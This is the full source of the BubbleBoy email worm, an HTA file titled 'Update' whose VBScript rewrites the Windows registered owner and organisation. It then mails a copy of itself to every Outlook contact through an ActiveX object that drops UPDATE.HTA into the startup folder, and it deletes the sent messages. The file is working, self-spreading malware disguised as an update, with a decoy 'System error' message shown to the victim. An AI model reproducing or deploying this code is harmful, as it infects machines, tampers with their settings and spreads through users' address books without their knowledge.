<head>
<title>
Update
</title>
</head>
<body bgcolor="#c0c0c0" text="#c0c0c0">
<script language="VBScript">
On Error Resume Next
Set Jerry = CreateObject("WScript.Shell")
Jerry.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","BubbleBoy"
Jerry.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","Vandelay Industries"
George = Jerry.RegRead("HKEY_LOCAL_MACHINE\Software\OUTLOOK.BubbleBoy\")
If George <> "OUTLOOK.BubbleBoy 1.0 by Zulu" Then
Set Elaine = CreateObject("Outlook.Application")
Set Seinfeld = Elaine.GetNameSpace("MAPI")
For Each Cosmo In Seinfeld.AddressLists
If Cosmo.AddressEntries.Count <> 0 Then
Set Kramer = Elaine.CreateItem(0)
For Costanza = 1 To Cosmo.AddressEntries.Count
Set Bennice = Cosmo.AddressEntries(Costanza)
If Costanza = 1 Then
Kramer.BCC = Bennice.Address
Else
Kramer.BCC = Kramer.BCC & "; " & Bennice.Address
End If
Next
Kramer.Subject = "BubbleBoy is back!"
Set Jason = CreateObject("Scripting.FileSystemObject")
Set Michael = Jason.OpenTextFile(Replace(Replace(Replace(Location.PathName,"/",""),"%20"," "),"%FA","Ú"),1)
Richards = False
Do While Michael.AtEndOfStream = False
Alexander = Michael.ReadLine
If Richards = False Then
If Right(Alexander,6) = "<" & "html>" Then
Richards = True
Julia = """<" & "html>"""
End If
Else
If Left(Alexander,7) = "<" & "/html>" Then
Julia = Julia & " & Chr(13) & Chr(10) & ""<" & "/html>"""
Richards = False
Else
Julia = Julia & " & Chr(13) & Chr(10) & """ & Replace(Alexander,"""","""""") & """"
End If
End If
Loop
Michael.Close
Kramer.HTMLBody = "<" & "html>" & Chr(13) & Chr(10) & "<" & "head>" & Chr(13) & Chr(10) & "<" & "title>" & Chr(13) & Chr(10) & "BubbleBoy is back!" & Chr(13) & Chr(10) & "<" & "/title>" & Chr(13) & Chr(10) & "<" & "/head>" & Chr(13) & Chr(10) & "<" & "body alink=""#ffffff"" bgcolor=""#000000"" link=""#ffffff"" text=""#ffffff"" vlink=""#ffffff"">" & Chr(13) & Chr(10) & "<" & "font face=""arial"" size=""4"">" & Chr(13) & Chr(10) & "<" & "strong>" & Chr(13) & Chr(10) & "The BubbleBoy incident, pictures and sounds" & Chr(13) & Chr(10) & "<" & "/strong>" & Chr(13) & Chr(10) & "<" & "br>" & Chr(13) & Chr(10) & "<" & "br>" & Chr(13) & Chr(10) & "<" & "a href=""http://www.towns.com/dorms/tom/bblboy.htm"">http://www.towns.com/dorms/tom/bblboy.htm<" & "/a>" & Chr(13) & Chr(10) & "<" & "/font>" & Chr(13) & Chr(10) & "<" & "object classid=""clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"" id=""Vandelay"">" & Chr(13) & Chr(10) & "<" & "/object>" & Chr(13) & Chr(10) & "<" & "object classid=""clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"" id=""SoupNazi"">" & Chr(13) & Chr(10) & "<" & "/object>" & Chr(13) & Chr(10) & "<" & "script language=""VBScript"">" & Chr(13) & Chr(10) & "On Error Resume Next" & Chr(13) & Chr(10) & "Vandelay.Path = ""C:\WINDOWS\START MENU\PROGRAMS\STARTUP\UPDATE.HTA""" & Chr(13) & Chr(10) & "Vandelay.Doc = " & Newman(Julia) & Chr(13) & Chr(10) & "Vandelay.Write" & Chr(13) & Chr(10) & "SoupNazi.Path = ""C:\WINDOWS\MENÚ INICIO\PROGRAMAS\INICIO\UPDATE.HTA""" & Chr(13) & Chr(10) & "SoupNazi.Doc = " & Newman(Julia) & Chr(13) & Chr(10) & "SoupNazi.Write" & Chr(13) & Chr(10) & "<" & "/script>" & Chr(13) & Chr(10) & "<" & "/body>" & Chr(13) & Chr(10) & "<" & "/html>" & Chr(13) & Chr(10)
Kramer.DeleteAfterSubmit = True
Kramer.Send
End If
Next
Jerry.RegWrite "HKEY_LOCAL_MACHINE\Software\OUTLOOK.BubbleBoy\","OUTLOOK.BubbleBoy 1.0 by Zulu"
End If
Function Newman(Moops)
Newman = Replace(Moops,"<h","<"" & ""h")
Newman = Replace(Newman,"<t","<"" & ""t")
Newman = Replace(Newman,"<b","<"" & ""b")
Newman = Replace(Newman,"<s","<"" & ""s")
Newman = Replace(Newman,"<f","<"" & ""f")
Newman = Replace(Newman,"</","<"" & ""/")
End Function
</script>
<font color="#000000">
<strong>
System error, delete "UPDATE.HTA" from the startup folder to solve this problem.
</strong>
</font>
</body>
</html>
